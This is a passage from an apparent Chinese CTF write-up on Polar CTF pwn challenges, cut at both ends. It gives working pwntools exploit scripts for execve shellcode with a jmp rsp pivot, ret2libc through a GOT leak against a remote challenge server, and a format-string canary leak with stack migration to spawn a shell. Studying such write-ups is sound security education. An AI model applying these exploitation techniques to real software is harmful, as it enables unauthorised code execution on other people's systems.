00</code>（小端存储）</li><li>总字节数：5 字节</li></ul><ol start="4"><li><code>mov edx, esi</code></li></ol><ul><li>操作码：<code>89</code>（<code>mov r/m32, r32</code>）</li><li>ModR&#x2F;M 字节：<code>F2</code>（<code>edx</code> 是目标寄存器，<code>esi</code> 是源寄存器）</li><li>总字节数：2 字节</li></ul><ol start="5"><li><code>syscall</code></li></ol><ul><li>操作码：<code>0F 05</code>（<code>syscall</code> 指令）</li><li>总字节数：2 字节</li></ul><p>总结</p><p>每条指令的字节长度如下：</p><ol><li><code>mov al, 0x3b</code>：2 字节</li><li><code>mov esi, edi</code>：2 字节</li><li><code>mov edi, 0x402047</code>：5 字节</li><li><code>mov edx, esi</code>：2 字节</li><li><code>syscall</code>：2 字节</li></ol><p>总字节数：2 + 2 + 5 + 2 + 2 &#x3D; <strong>13 字节</strong>。刚好够写</p><p>故最后完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&quot;node4.buuoj.cn&quot;, 25882)</span></span><br><span class="line">io=process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">buf_addr=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;buf_addr &gt;&gt;&gt; 0x%x&quot;</span> % buf_addr)</span><br><span class="line"></span><br><span class="line">jmp_rsp=<span class="number">0x401380</span></span><br><span class="line">bin_sh=<span class="number">0x402047</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode= b&#x27;a&#x27;*13 #13</span></span><br><span class="line">shellcode=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov al,0x3b</span></span><br><span class="line"><span class="string">mov esi,edi</span></span><br><span class="line"><span class="string">mov edi,0x402047</span></span><br><span class="line"><span class="string">mov edx,esi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">shellcode += p64(jmp_rsp)</span><br><span class="line">shellcode += asm(<span class="string">&quot;sub rsp, 0x15 ; jmp rsp&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;b* 0x40132D&quot;)</span></span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="kio"><a href="#kio" class="headerlink" title="kio"></a>kio</h2><p>check</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] &#x27;/home/pwn/桌面/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>只要满足v4&#x3D;&#x3D;520 n&#x3D;520即可进入xxx函数该处存在一个大的溢出点可以打libc</p><p>xxx</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">xxx</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to Polar CTF!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x150</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+5Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;choose your challenge\n:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.write shell&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.use shell&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.exif&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">switch</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      wrshell();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      usshell();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      exif();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter a:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">520</span> &amp;&amp; n == <span class="number">520</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;GOOD&quot;</span>);</span><br><span class="line">    xxx();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Bless you&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单的菜单模板</p><p>ida中查看发现n位于bss段上</p><p>wrshell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">wrshell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+8h] [rbp-58h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-54h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter number:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter sehll:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">88uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析发现wrshell中有8个字节的溢出刚好可以覆盖rbp</p><p>观察main函数中if部分的汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400890 8B 45 FC                      mov     eax, [rbp+var_4]</span><br><span class="line">.text:0000000000400893 3D 08 02 00 00                cmp     eax, 208h</span><br><span class="line">.text:0000000000400898 75 23                         jnz     short loc_4008BD</span><br><span class="line">.text:0000000000400898</span><br><span class="line">.text:000000000040089A 8B 05 EC 07 20 00             mov     eax, cs:n</span><br><span class="line">.text:00000000004008A0 3D 08 02 00 00                cmp     eax, 208h</span><br><span class="line">.text:00000000004008A5 75 16                         jnz     short loc_4008BD</span><br></pre></td></tr></table></figure><p>故想要能够进入xxx函数需要[rbp+var_4]地址上的数据和n同时为520才不会跳转到loc_4008BD中也就是else的部分，wrshell中的8个字节刚好可以覆盖rbp结合leave ret可以控制到原函数后的rbp的值，故只需将[rbp+var_4]改为n的地址两次cmp的都是n的值，n也作为了scanf的参数，故直接输入520即可进入xxx函数</p><blockquote><p>补充一下leave指令</p><p>leave相当于mov rsp,rbp;pop rbp也就是先将此时rbp的值赋给栈顶，再将栈顶的值pop到rbp中</p></blockquote><p>故我们利用wrshell中的read溢出的8个字节将rbp修改为n地址+4(加4是因为var_4是-4故要保证rbp+var_4是n的地址需要加4)，之后leave后父函数此时的rbp就变成了n地址加4。</p><p><img src="/../images/polarwp/koi.png" alt="1"></p><p>图片展示的是通过覆盖rbp加leave后将rbp的值修改成了<code>12345678</code>，证明我们成功控制了rbp</p><p>接下来换为n的地址+4即可</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#context(os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;, log_level = &#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2106</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">n_addr=<span class="number">0x0060108C</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>)+p64(n_addr+<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;520&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">xxx_addr=elf.symbols[<span class="string">&#x27;xxx&#x27;</span>]</span><br><span class="line">pop_rdi_ret=<span class="number">0x400a63</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">80</span>+<span class="number">8</span>)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(xxx_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts_addr=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line">libc_base=puts_addr-<span class="number">0x06f6a0</span></span><br><span class="line">system_addr=libc_base+<span class="number">0x0453a0</span></span><br><span class="line">bin_sh=libc_base+<span class="number">0x18ce57</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">80</span>+<span class="number">8</span>)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://libc.blukat.me/?q=puts:6a0&l=libc6_2.23-0ubuntu11.3_amd64">libc database search</a>有了地址的后三位之后可以用该网站来查libc。</p><h2 id="bllbl-mom"><a href="#bllbl-mom" class="headerlink" title="bllbl_mom"></a>bllbl_mom</h2><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>漏洞函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mom</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">68</span>]; <span class="comment">// [esp+8h] [ebp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Write a few words to Mom&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">5u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x58</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x58</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给了system函数但是没有bin_sh，存在格式化字符串漏洞可以利用第一个read输入格式化字符在printf处泄露出canary</p><p>第二个或第三个read可溢出的字节数除去ebp和返回地址只剩下了4溢出后还要加上canary的值显然是不太够的，所以我们想到了栈迁移，第一次leave ret将ebp的值修改为我们想要迁移到的位置即输入提权内容的地址，第二次leave ret将esp迁移到新ebp处接着pop ebp ，esp随之下移到system_plt地址，接着ret也就是pop eip将system_plt地址弹到eip中调用system这样就成功绕过了NX保护使栈上的system可执行了</p><p><strong>栈迁移的本质就是通过改变ebp的值改变esp的指向进而使用ret控制执行流</strong></p><p><img src="/../images/polarwp/%E6%A0%88%E8%BF%81%E7%A7%BB.png" alt="1"></p><p>故总体思路为，先利用第一个read泄露出canary，第二个read泄露出ebp的值，第三个read写提权内容。</p><p>泄露canary：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io.send(b&#x27;%23$p&#x27;)</span><br><span class="line">io.recvuntil(b&#x27;0x&#x27;)</span><br><span class="line">canary=int(io.recv(8),16)</span><br><span class="line">print(b&#x27;canary&gt;&gt;&gt;&#x27;+hex(canary))</span><br></pre></td></tr></table></figure><p>因为只有5个字节，不好测格式化字符的偏移，一般为6如果不对的话只有爆破尝试了，通过gdb测量canary与输入位置之间的距离‘</p><p><img src="/../images/polarwp/mom.png" alt="1"></p><p>该图是第一个read输入aaaa后的状态</p><p>汇编里可以看到canary的地址在ebp-0xc处故通过p&#x2F;x计算出其地址，发现为0x17处减去输入位置的0x06即为0x11&#x3D;17,17+6&#x3D;23</p><p>故第一个read输入%23$p输出canary的值</p><p>通过观察mom函数汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">.text:0804863A                               ; __unwind &#123;</span><br><span class="line">.text:0804863A 55                            push    ebp</span><br><span class="line">.text:0804863B 89 E5                         mov     ebp, esp</span><br><span class="line">.text:0804863D 83 EC 58                      sub     esp, 58h</span><br><span class="line">.text:08048640 65 A1 14 00 00 00             mov     eax, large gs:14h</span><br><span class="line">.text:08048646 89 45 F4                      mov     [ebp+var_C], eax</span><br><span class="line">.text:08048649 31 C0                         xor     eax, eax</span><br><span class="line">.text:0804864B 83 EC 0C                      sub     esp, 0Ch</span><br><span class="line">.text:0804864E 68 B0 87 04 08                push    offset format                   ; &quot;Write a few words to Mom&quot;</span><br><span class="line">.text:08048653 E8 F8 FD FF FF                call    _printf</span><br><span class="line">.text:08048653</span><br><span class="line">.text:08048658 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:0804865B 83 EC 04                      sub     esp, 4</span><br><span class="line">.text:0804865E 6A 05                         push    5                               ; nbytes</span><br><span class="line">.text:08048660 8D 45 B0                      lea     eax, [ebp+buf]</span><br><span class="line">.text:08048663 50                            push    eax                             ; buf</span><br><span class="line">.text:08048664 6A 00                         push    0                               ; fd</span><br><span class="line">.text:08048666 E8 D5 FD FF FF                call    _read</span><br><span class="line">.text:08048666</span><br><span class="line">.text:0804866B 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:0804866E 83 EC 0C                      sub     esp, 0Ch</span><br><span class="line">.text:08048671 8D 45 B0                      lea     eax, [ebp+buf]</span><br><span class="line">.text:08048674 50                            push    eax                             ; format</span><br><span class="line">.text:08048675 E8 D6 FD FF FF                call    _printf</span><br><span class="line">.text:08048675</span><br><span class="line">.text:0804867A 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:0804867D 83 EC 04                      sub     esp, 4</span><br><span class="line">.text:08048680 6A 58                         push    58h ; &#x27;X&#x27;                       ; nbytes</span><br><span class="line">.text:08048682 8D 45 B0                      lea     eax, [ebp+buf]</span><br><span class="line">.text:08048685 50                            push    eax                             ; buf</span><br><span class="line">.text:08048686 6A 00                         push    0                               ; fd</span><br><span class="line">.text:08048688 E8 B3 FD FF FF                call    _read</span><br><span class="line">.text:08048688</span><br><span class="line">.text:0804868D 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:08048690 83 EC 08                      sub     esp, 8</span><br><span class="line">.text:08048693 8D 45 B0                      lea     eax, [ebp+buf]</span><br><span class="line">.text:08048696 50                            push    eax</span><br><span class="line">.text:08048697 68 C9 87 04 08                push    offset aS                       ; &quot;%s&quot;</span><br><span class="line">.text:0804869C E8 AF FD FF FF                call    _printf</span><br><span class="line">.text:0804869C</span><br><span class="line">.text:080486A1 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:080486A4 83 EC 04                      sub     esp, 4</span><br><span class="line">.text:080486A7 6A 58                         push    58h ; &#x27;X&#x27;                       ; nbytes</span><br><span class="line">.text:080486A9 8D 45 B0                      lea     eax, [ebp+buf]</span><br><span class="line">.text:080486AC 50                            push    eax                             ; buf</span><br><span class="line">.text:080486AD 6A 00                         push    0                               ; fd</span><br><span class="line">.text:080486AF E8 8C FD FF FF                call    _read</span><br><span class="line">.text:080486AF</span><br><span class="line">.text:080486B4 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:080486B7 83 EC 08                      sub     esp, 8</span><br><span class="line">.text:080486BA 8D 45 B0                      lea     eax, [ebp+buf]</span><br><span class="line">.text:080486BD 50                            push    eax</span><br><span class="line">.text:080486BE 68 C9 87 04 08                push    offset aS                       ; &quot;%s&quot;</span><br><span class="line">.text:080486C3 E8 88 FD FF FF                call    _printf</span><br><span class="line">.text:080486C3</span><br><span class="line">.text:080486C8 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:080486CB B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:080486D0 8B 55 F4                      mov     edx, [ebp+var_C]</span><br><span class="line">.text:080486D3 65 33 15 14 00 00 00          xor     edx, large gs:14h</span><br><span class="line">.text:080486DA 74 05                         jz      short locret_80486E1</span><br><span class="line">.text:080486DA</span><br><span class="line">.text:080486DC E8 8F FD FF FF                call    ___stack_chk_fail</span><br></pre></td></tr></table></figure><p>发现只有在最后才异或检测canary的值，所以我们在最后一次read补上canary的值即可</p><p>第二次read泄露ebp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1=b&#x27;a&#x27;*(0x50-1)+b&#x27;b&#x27;</span><br><span class="line">io.send(payload1)</span><br><span class="line">io.recvuntil(b&#x27;b&#x27;)</span><br><span class="line">ebp_addr=u32(io.recvuntil(b&#x27;\xff&#x27;)[-4:])</span><br></pre></td></tr></table></figure><p>测量ebp距离输入点的偏移</p><p><img src="/../images/polarwp/momebp.png" alt="1"></p><p>输入了aaa故ebp距离输入点0x98-0x38&#x3D;0x60注意这里是用ebp的值去减也就是198而不是188因为我们是将ebp的值赋给esp而不是将其地址赋给esp这点要注意</p><p>第三次read</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s_addr=ebp_addr-0x60</span><br><span class="line">sh_addr=s_addr-0x10</span><br><span class="line"></span><br><span class="line">payload2=b&#x27;aaaa&#x27;+p32(system_addr)+p32(0)+p32(sh_addr)+b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">io.send(payload2)</span><br></pre></td></tr></table></figure><p>s_addr就是我们payload2开始放置的位置，payload2中前4个a是因为栈迁移之后esp指向ebp的值的位置也就是我们的初始输入位置，此时会pop ebp，会将前4个字节的数据弹到ebp里接着esp+4 执行ret也就是pop eip，故前4个字节无效用aaaa填充接着写system的地址</p><p>sh_addr要减0x10是因为b’aaaa’+p32(system_addr)+p32(0)+p32(sh_addr)刚好是16个字节也就是0x10之后的地址才是我们的<code>/bin/sh\x00</code></p><p>接着运行一次测试canary要放在哪</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)</span></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;1.95.36.136&#x27;,2106)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system_addr=<span class="number">0x08048490</span></span><br><span class="line">leave_ret=<span class="number">0x08048538</span></span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;%23$p&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span> (io.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary&gt;&gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>)+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">ebp_addr=u32(io.recvuntil(<span class="string">b&#x27;\xff&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">s_addr=ebp_addr-<span class="number">0x60</span></span><br><span class="line">sh_addr=s_addr+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload2=<span 